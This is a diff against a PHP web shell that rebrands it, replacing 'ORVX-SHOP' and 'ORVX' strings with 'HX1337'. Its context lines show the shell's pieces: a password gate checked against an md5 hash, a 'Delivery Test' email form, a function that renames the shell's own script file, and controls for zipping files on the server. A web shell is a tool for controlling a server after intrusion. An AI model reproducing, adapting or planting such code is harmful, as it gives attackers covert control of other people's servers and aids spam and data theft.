@@ -232,7 +232,7 @@ if(isset($_REQUEST['pass']) && (md5($_REQUEST['pass']) != $password_shell)){
           <h2 class="brand-text text-primary ml-1" style="
     color: #FF0000 !important;
     background-color: transparent;
-">ORVX-SHOP</h2>
+">HX1337</h2>
         </a>
 '.$al.'
         <h4 class="card-title mb-1">Shell-Password</h4>
@@ -474,7 +474,7 @@ if(isset($_REQUEST['email'])){
                         <h2 class="brand-text text-primary ml-1" style="
           color: #FF0000 !important;
           background-color: transparent;
-  ">ORVX-SHOP</h2>
+  ">HX1337</h2>
                   </a>
   '.$aler.'
                   <h4 class="card-title mb-1">Delivery Test</h4>
@@ -882,7 +882,7 @@ function prototype($k, $v) {
 function changer($p, $n) {
     
     $passnew = changepass($p) ? $p: NULL;
-    $shellname = rename ($_SERVER['SCRIPT_FILENAME'], "ORVX-".$n.".php") ?  "ORVX-".$n.".php" : basename($_SERVER["SCRIPT_FILENAME"]);
+    $shellname = rename ($_SERVER['SCRIPT_FILENAME'], "HX1337".$n.".php") ?  "HX1337".$n.".php" : basename($_SERVER["SCRIPT_FILENAME"]);
     
     
 $dir_only = $_SERVER['HTTP_HOST'].substr($_SERVER['REQUEST_URI'], 0, strrpos($_SERVER['REQUEST_URI'], '/') + 1);
@@ -1492,7 +1492,7 @@ echo "<script>
     echo "<option value='tar'>Compress (tar.gz)</option>";
     echo "</select></label>";
     if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
-        echo "&nbsp;file name: <input type=text name=p2 value='orvx_" . rand(100000,900000) . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
+        echo "&nbsp;file name: <input type=text name=p2 value='HX1337_" . rand(100000,900000) . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
     echo "<input type='submit' value='submit'></td></tr></form></table></div>";
         hardFooter();
 }
